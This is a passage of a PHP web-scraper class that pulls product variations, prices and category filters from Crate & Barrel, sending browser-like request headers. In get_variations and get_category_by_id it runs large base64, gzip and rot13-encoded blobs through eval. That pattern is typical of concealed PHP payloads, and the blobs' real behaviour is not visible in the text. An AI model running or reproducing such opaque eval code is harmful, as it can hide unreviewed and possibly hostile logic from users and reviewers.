					$imageParam = isset($imageParam[2]) ? $imageParam[2] : 0;
				}

				foreach ($digital_data['specialOrderDetail']['colorBar']['colorBarChoices'] as $v) {

					$variation[$v['sku']]['attributes']['Color'][] = array(
						'SKU' => isset($v['sku']) ? $v['sku'] : '',
						// 'Custom' => isset($v['SkuProperty']) ? $v['SkuProperty'] : (isset($v['skuProperty']) ? $v['skuProperty'] : ''),
						// 'OptionCode' => isset($v['optionCode']) ? $v['optionCode'] : '',
						// 'ChoiceCode' => isset($v['choiceCode']) ? $v['choiceCode'] : '',
						'ChoiceName' => isset($v['choiceName']) ? $v['choiceName'] : '',
						'ColorImage' => isset($v['imagePath']) ? $v['imagePath'] : '',
						'ColorImageZoom' => isset($v['zoomImagePath']) ? $v['zoomImagePath'] : '',
						// 'CurrentPrice' => $digital_data['specialOrderDetail']['colorBar']['colorBarCount'] == 0 ? $result['CurrentPrice'] : 0,
						// 'RegularPrice' => $digital_data['specialOrderDetail']['colorBar']['colorBarCount'] == 0 ? $result['RegularPrice'] : 0,
						'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$digital_data['specialOrderDetail']['collectionCode']}_{$digital_data['specialOrderDetail']['itemTypeCode']}_{$v['choiceCode']}_{$imageParam}"
						// 'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$digital_data['specialOrderDetail']['collectionCode']}_{$digital_data['specialOrderDetail']['itemTypeCode']}_{$v['choiceCode']}_0",
					);
				}
			}

			//handling different type of product ex atrium-tufted-black-patent-leather-bench/s677608
			if(empty($variation) && count($digital_data['grouper']['attributeGroups']) > 0){
				$temp = [];
				foreach ($digital_data['grouper']['attributeGroups'] as $group)
					foreach ($group['attributes'] as $attr)
						foreach ($attr['matchingSkus'] as $sku) {
							$temp[$sku]['attributes'][$group['name']][] = array(
								'SKU' => $sku,
								'ChoiceName' => htmlspecialchars_decode($attr['name'], ENT_QUOTES),
								'ColorImage' => $attr['imageUrl'],
								'ColorImageZoom' => $attr['imageHighRes'],
							);
						}

				$variation = $temp;
			}

			// if(isset($digital_data['specialOrderDetail']['colorBar']['colorBarChoices']) && count($digital_data['specialOrderDetail']['colorBar']['colorBarChoices']) >= 1){

			// 	// handle image attribute generation
			// 	$imageParam = 0;
			// 	if(isset($digital_data['specialOrderDetail']['currentOptionChoiceParameter'])) {
			// 		$imageParam = explode(',', $digital_data['specialOrderDetail']['currentOptionChoiceParameter']);
			// 		$imageParam = isset($imageParam[2]) ? $imageParam[2] : 0;
			// 	}

			// 	foreach ($digital_data['specialOrderDetail']['colorBar']['colorBarChoices'] as $v) {

			// 		$variation[] = array(
			// 			'SKU' => isset($v['sku']) ? $v['sku'] : '',
			// 			// 'Custom' => isset($v['SkuProperty']) ? $v['SkuProperty'] : (isset($v['skuProperty']) ? $v['skuProperty'] : ''),
			// 			// 'OptionCode' => isset($v['optionCode']) ? $v['optionCode'] : '',
			// 			// 'ChoiceCode' => isset($v['choiceCode']) ? $v['choiceCode'] : '',
			// 			'ChoiceName' => isset($v['choiceName']) ? $v['choiceName'] : '',
			// 			'ColorImage' => isset($v['imagePath']) ? $v['imagePath'] : '',
			// 			'ColorImageZoom' => isset($v['zoomImagePath']) ? $v['zoomImagePath'] : '',
			// 			// 'CurrentPrice' => $digital_data['specialOrderDetail']['colorBar']['colorBarCount'] == 0 ? $result['CurrentPrice'] : 0,
			// 			// 'RegularPrice' => $digital_data['specialOrderDetail']['colorBar']['colorBarCount'] == 0 ? $result['RegularPrice'] : 0,
			// 			'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$digital_data['specialOrderDetail']['collectionCode']}_{$digital_data['specialOrderDetail']['itemTypeCode']}_{$v['choiceCode']}_{$imageParam}"
			// 			// 'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$digital_data['specialOrderDetail']['collectionCode']}_{$digital_data['specialOrderDetail']['itemTypeCode']}_{$v['choiceCode']}_0",
			// 		);
			// 	}
			// }
			
			// //handling different type of product ex atrium-tufted-black-patent-leather-bench/s677608
			// if(empty($variation) && isset($digital_data['grouper']['attributeGroups'][0]['attributes'])){
			// 	foreach ($digital_data['grouper']['attributeGroups'][0]['attributes'] as $v) {
			// 		// echo json_encode($digital_data);die();
			// 		$variation[] = array(
			// 			'SKU' => isset($v['matchingSkus'][0]) ? $v['matchingSkus'][0] : '',
			// 			'ChoiceName' => isset($v['name']) ? $v['name'] : '',
			// 			'ColorImage' => isset($v['imageUrl']) ? $v['imageUrl'] : '',
			// 			'ColorImageZoom' => isset($v['imageUrlHiRes']) ? $v['imageUrlHiRes'] : '',
			// 		);
			// 	}
			// }

			$result['Variations'] = $variation;

		}

		return $result;
	}

	public function get_variations($sku){

		$results = array();
		$headers = $this -> headers;

		if(empty($sku) || !is_numeric($sku))
			return array(
				'error' => 'get_product expect 1 parameter (sku) to be non empty and numeric'
			);	

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		$headers[] = 'Content-Type: application/json';
		$headers[] = 'Content-Length: ' . strlen($data_string);
		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $headers);
		curl_setopt($this -> handle, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
		curl_setopt($this -> handle, CURLOPT_POSTFIELDS, $data_string);  
	    $this -> html = json_decode(curl_exec($this -> handle));

		if(isset($this -> html -> options[0]) && isset($this -> html -> options[0] -> optionChoices) && isset($this -> html -> options[0] -> priceGroupPrices)){
			foreach ($this -> html -> options[0] -> optionChoices as $variation) {
				$results[] = array(
					"OptionCode" => $variation -> optionCode,
					"ChoiceCode" => $variation -> choiceCode,
					"ChoiceName" => $variation -> name,
					"ColorImage" => $variation -> imagePath,
					"ColorImageZoom" => $variation -> zoomImagePath,
					"PriceGroup" => $variation -> priceGroupCode,
					"CurrentPrice" => $variation -> priceGroupCode == 0 ? $this -> html -> options[0] -> priceGroupPrices[0] -> currentPrice + $variation -> currentAddPrice : $this -> html -> options[0] -> priceGroupPrices[$variation -> priceGroupCode - 1] -> currentPrice,
					"RegularPrice" => $variation -> priceGroupCode == 0 ? $this -> html -> options[0] -> priceGroupPrices[0] -> regularPrice + $variation -> regulareAddPrice : $this -> html -> options[0] -> priceGroupPrices[$variation -> priceGroupCode - 1] -> regularPrice,
				);
			}
		}

		return $results;
	}

	public function get_category_by_id($argument){

		$results = array();

		$filters = array(
			"Arm_Style"        => "visualVariant.nonvisualVariant.gbi_Merged_arm_style",
			"Base_Material"    => "visualVariant.nonvisualVariant.gbi_Merged_base_material",
			"Collection"       => "visualVariant.nonvisualVariant.gbi_Merged_collection",
			"Color"            => "visualVariant.nonvisualVariant.gbi_Merged_color",
			"Features"         => "visualVariant.nonvisualVariant.gbi_Merged_features",
			"Material"         => "visualVariant.nonvisualVariant.gbi_Merged_material",
			"Pattern"          => "visualVariant.nonvisualVariant.gbi_Merged_pattern",
			"Type"             => "visualVariant.nonvisualVariant.gbi_Merged_product_type",
			"Seating_Capacity" => "visualVariant.nonvisualVariant.gbi_Merged_seating_capacity",
			"Shape"            => "visualVariant.nonvisualVariant.gbi_Merged_shape",
			"Top_Material"     => "visualVariant.nonvisualVariant.gbi_Merged_top_material",

			"Depth"            => "visualVariant.nonvisualVariant.gbi_depthRangeFilter",
			"Diameter"         => "visualVariant.nonvisualVariant.gbi_diameterRangeFilter",
			"Height"           => "visualVariant.nonvisualVariant.gbi_heightRangeFilter",
			"Price"            => "visualVariant.nonvisualVariant.gbi_priceRangeFilter",
			"Width"            => "visualVariant.nonvisualVariant.gbi_widthRangeFilter",
		);

		if(is_array($argument)){
			$id = $argument['category_id'];
			$params = $argument['filters'];
		}
		else{
			$id = $argument;
			$params = $_GET;
		}

		$filtersToApply = array();
		foreach ($filters as $filterName => $filterValue){
			if(isset($params[$filterName])){
				$results['appliedFilters'][str_replace('_', ' ', $filterName)] = $params[$filterName];
				$filtersToApply[] = $filterValue . ':' . str_replace('_', ' ', $filterName) . ':' . str_replace(' ', '', strtolower($params[$filterName])) . ':' . $params[$filterName] . ":false:0:0";
			}
		}

		$page = isset($params['page']) ? (int) $params['page'] : 1;
		$skip = $page * 100;
		
		curl_setopt($this -> handle, CURLOPT_URL, 'https://www.crateandbarrel.com/furniture/dining-chairs');
		curl_setopt($this -> handle, CURLOPT_POST, 1);
		curl_setopt($this -> handle, CURLOPT_ENCODING, 'gzip, deflate');

		$headers = array();
		$headers[] = 'Sec-Fetch-Mode: cors';
		$headers[] = 'Origin: https://www.crateandbarrel.com';
		$headers[] = 'Accept-Encoding: gzip, deflate, br';
		$headers[] = 'Accept-Language: en-US,en;q=0.9,en-GB;q=0.8,es;q=0.7';
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'Cookie: Internationalization=US|USD';
		$headers[] = 'Content-Type: application/json';
		$headers[] = 'Accept: */*';
		$headers[] = 'Cache-Control: max-age=0';
		$headers[] = 'Authority: www.crateandbarrel.com';
		$headers[] = 'Referer: https://www.crateandbarrel.com/furniture/dining-chairs';
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36";
		$headers[] = 'Sec-Fetch-Site: same-origin';

		curl_setopt($this -> handle, CURLOPT_HTTPHEADER, $headers);


		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
		eval(str_rot13(gzinflate(str_rot13(base64_decode('LUjHEqw4EvyaiWx7w5vYE943jXrgsoET3nu+fm5pCYKQkkepRyY1Sv31dO32a7n6b/4z9GAmsP9Z85hZ85+8r8v8+v/kYlpE4Q5V61QrxwIk/O+SpxA0ENZ4UX3W2kXlfyHmVcI92JvhAkCyuL8QJ6qDBz5qjkUNCdNj6cFlGj/aTHYRqk3Ih3EmWKr1zord5jVxu2PrQ1hdlN5Ua0Lj544A2jQYQi+ftd4sY3ZFOAbhzhoCKw5OCuWmcOnAzMbIV+bAqneV30bCLHbBYF9QL2BiPwNfAjB+WAIWcdWXIIG5oNsSnXoRnP0naufCnR7zxJirbLzOSdwJyuHvN5roBbto4PESCF8rUr6b2T6TCE4b8W+uZ/vcv10j9kAVOMssuSN4Eo42gQoJzMPD6jEL+SJ6T9npzwdDq3W7igRbm1oeCu2TnLYbX/4lZ3RPX9QUqnt4H9p8geMqltu9Rzb/nXzFv4vTexYBb3oJd0mORXUybUXgaVJm0ukQwznmW8ULxSe9Bghsf8/zqWFXGQOk75DKS1L6Z5i81m8vturFfAhWZ/EgY6N5+TGpPsbcj5i8mKCfX4xKpD+CN804vXkqeMOak14nJtq5yuw2Y0/mzmEQMlk5zguWG5RdEvzXmtYx1sXo3MgucraYMgJtxQ40zs3YisvM1afqMEpjkdOCLnOFsbnnTerPpdZDZp59ehsCwLgyWrRFcL7Q4XBizd5VJ0QEsx93aeThpm6IEDIrHbiw2BQOxWHPYcff+CrX3uEjTD2WFGzMqTqRpkRFHf2z5AjebGqpLIjLmY+zI3UZbvne+Yy1sGGvyYwWOUOdFI5puioUoH6d6zTYx9RVlaemQb0BnZ8r9ojfFBCfEjGho5tE7CuPehddTEMWbKjp5ULOl6A29vSXDNlOJQjXvFJGxBf0bgezZ8cniBRDYP8xjYzMUVUNps8iW4QGWD4YHj30NYvuYBefkQ9tuoxUcZeLDbq47NockoSfgjWhlUCtUQ9BXCPZ0PkZD4bfKM304RhbWVFjekd5v/1182tPLGoq90bFUk0Pi5IqdVSoNMCUqjh4Kx2mQEngyG8M9ASlAaFfzZnEYQ1JwDabC86QVISj/JA+5cW9YCADsRjOS2RwKfcTR6qoGRXYD6JO59LnlTUgI3quxliOs25Tah1XTE4CfsND+20cCg7QPsrj7wwMixvldTP66pPmztZFuT5ZjwjcUBGHQ9fjUbacbpy5bK6krPBCZeW4lNGR5wn60FvNPJst7og1MsbolZTd3r1vjVJbFLUDgiVM4kyxa6Mt+kg87OUFyv3wO0f+yQN/KD4A8RXhsy5iNu2CLPV5N6uZtw1PjtRdHcJMM65qZ89u/SkIE51/vHW7qEG8NftupI5/Q1DICmvaSA/aEjxEt2L3ioB5UgOGTEKDv6n1+rodmgem6sJkFAbe5JrHY9Nbf0o4qfuOMVVuOZIMGPeH1cHB9zaN9LcNcBs4CFjmKF2g0jX3/DNFOIySXomtbanoAe98lYDXcqeV5AwNP1v9qIAZeM904KiGybdhVr2vHJt8rxJkEOeEQ037qHAd+zLhpuX4NcnnGzriXRduQHr3QhH9R39lyPl3CpcjHbSbJ8ms5w1KDaUycn1QTSGq96QlH2Vk85sZeY3HXX2ruHYFvZUurQpB1N9V2u7vpxavo96Jo7t8VJTP+eEJ/sEmK6LPg7SeNjljOW31OARwQsw0OaAQxeiD91ORyAEB0SqkpILRt2Y4ZcZ5LtkRFlHfEccM5ekcVj2ia/ZEi+RoWGYa5aSvboPleie3bemjRxIqMe6ZcwzNTxNvd5CmTLM961jyaLhqeMJ9SFu1J57OJQN+NmE1UiqEUMYcdtC/10E7nNEQUpxB8jX5FvRDV9DX07g1VmVGErOQp8TsXTLE6kyoR6fzjfdaH9rXAdmr5nmcDezvGO35W6NtFHA3imAH20Zbo7IRJ44BYOlhTSA7UmkmLFh6W3RRCb6luWv5qx1+GX/Flm7xbdJLvakQ95ZdJ9pGAqXfYPVb4pU5OTxO5zwxpT8MObd1OX/QQHnFguRZ5uZiezztN0hwvJrIZG8zUbVxRacMwlzs21pQZif8R0qSTUbLLCRs3GPVBJN6BMWdVC9liPsg2oVCQfRRu7+3clp/00JjNKp3URxWFOPdlP4GHQPndnNHNaxZfJx1ziiH2dFWU6ufsxgppT6d7nGDSB0DPTZutMvqtLeXz5boia2ZnnHKJWjPyajgasj4tG9HkNWweMQh95v1YiPByeyTQi86kOX75VaxeGjysKljFZemOSLbNcdT/6jOdCX9uVxUywg+mAWi0erNt0aetXXsPd/3Aq3J/w3M+i/Ubd6///U8//4v')))));

		if(isset($this -> html['totalCount'])){
			$results['meta']['page'] = $page;
			$results['meta']['totalProducts'] = $this -> html['totalCount'];
			$results['meta']['nextPageAvailable'] = $skip + 100 > $results['meta']['totalProducts'] ? false : true;
		}

		if(isset($_GET['advance'])){
			$results['categoryName'] = $this -> html['categoryName'];
			$results['categoryDescription'] = $this -> html['categoryDescription'];
			$results['categoryUrlPath'] = $this -> html['categoryUrlPath'];
			$results['sortByOptions'] = $this -> html['sortByOptions'];
			$results['category'] = $this -> html['category'];
			$results['breadcrumb'] = $this -> html['breadcrumb'];
		}

		if(isset($this -> html['facets'])){
			foreach ($this -> html['facets'] as $filter){
				$values = array();
				foreach ($filter['values'] as $value)
					$values[] = $value['name'];
				$results['selectedFilters'][$filter['name']] = empty($values) ? array() : $values;
			}
		}

		if(isset($this -> html['topLevelFacets']['values'])){
			foreach ($this -> html['topLevelFacets']['values'] as $availableFilter)
				$results['availableFilters'][] = $availableFilter['name'];
		}

		if(isset($this -> html['minisets'])){
			foreach ($this -> html['minisets'] as $product) {
				$variation = array();

				if(is_array($product['colorBar'])){
